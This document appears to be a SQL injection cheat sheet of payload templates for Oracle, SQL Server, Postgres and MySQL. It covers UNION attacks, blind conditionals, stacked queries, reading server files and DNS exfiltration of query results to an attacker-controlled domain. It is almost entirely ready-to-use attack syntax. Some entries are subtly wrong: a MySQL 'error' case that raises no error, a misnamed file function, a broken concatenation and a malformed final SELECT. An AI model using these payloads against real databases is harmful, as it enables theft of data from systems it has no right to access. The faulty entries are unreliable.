# SQL Injection
## Union Attacks
**Requires knowing number of columns returned**
**Requires selected columns matching datatypes from original query**
- `UNION SELECT <COL1> FROM <TABLE>`

### Determining Column Length
- `ORDER BY <x>--` 
- `UNION SELECT NULL,[NULL,...]--`
	- Oracle - `SELECT NULL,[NULL,...] FROM DUAL--`
Repeat until unexpected behaviour occurs

## Conditionals
**Useful for blind enumeration of DB contents**
- Oracle - `SELECT CASE WHEN (<CONDITION>) THEN <TRUE> [ELSE <FALSE>] END FROM dual`
- Microsoft - `IF (<CONDITION>) <TRUE> [<FALSE>]`
- Microsoft / Postgres - `SELECT CASE WHEN (<CONDITION>) THEN <TRUE> ELSE <FALSE> END`
- MySql / MariaDB - `SELECT IF (<CONDITION>, <TRUE>, <FALSE>)`
### Fixed Conditions
- TRUE -> `OR 1=1--`
- FALSE -> `AND 1=2--`
- Error -> 
	- Oracle - `to_char(1/0)`
	- Microsoft - `1/0`
	- Postgres - `cast(1/0 as text)`
	- MySql / MariaDB - `SELECT table_name FROM information_schema.tables`

## Comments
- Oracle / Microsoft / Postgres - `--COMMENT` `/*COMMENT*/`
- MySQL / MariaDB - `#COMMENT` `-- COMMENT` `/*COMMENT*/`

## String Concatenation
**Useful for dumping char/varchar information inside a single char/varchar column**
- Oracle / Postgres - `'<STR>'||'<ING>'`
- Microsoft - `'<STR>'+'<ING>'`
- MySQL / MariaDB - `'<STR>' '<ING>'` `CONCAT('<STR>','<ING>')`

## Joining Rows
**Useful if reflection only takes first row**
- Oracle - `listagg(<COL>, "\n")`
- Microsoft / Postgres - `string_agg(<COL>, "\n")`
- MySQL / MariaDB - `group_concat(<COL1>, ":", <COL2>, "\n")`

## Substring
- Oracle - `SUBSTR('foobar', 4, 2)` -> 'ba'
- Microsoft / Postgres / MySql / MariaDB - `SUBSTRING('foobar', 4, 2)` -> 'ba'

## Stacked Queries
- Oracle - None
- Microsoft / Postgres / MySql / MariaDB - `<QUERY1>;<QUERY2>`

## Reading Files
- Postgres (Only in data directory) - `SHOW data_directory` -> `PG_READ_FILE('<REL_PATH>')`
- MySql / MariaDB - `READ_FILE('<ABS_PATH>')`

## DNS with Data Exfiltration
- Oracle - `SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(<QUERY>)||'.<DOMAIN>/"> %remote;]>'),'/l') FROM dual`
- Microsoft - `declare @p varchar(1024);set @p=(<QUERY>);exec('master..xp_dirtree "//'+@p'.<DOMAIN>/a"')`
- Postgres - `create OR replace function f() returns void as $$;declare c text; declare p text; begin; SELECT into p (<QUERY>); c := 'copy (SELECT '''') to program ''nslookup '||p||'.<DOMAIN>''';execute c;END;$$ language plpgsql security definer; SELECT ();`
- MySql / MariaDB (Windows only) - `<QUERY> INTO OUTFILE '\\\\<DOMAIN>\a'`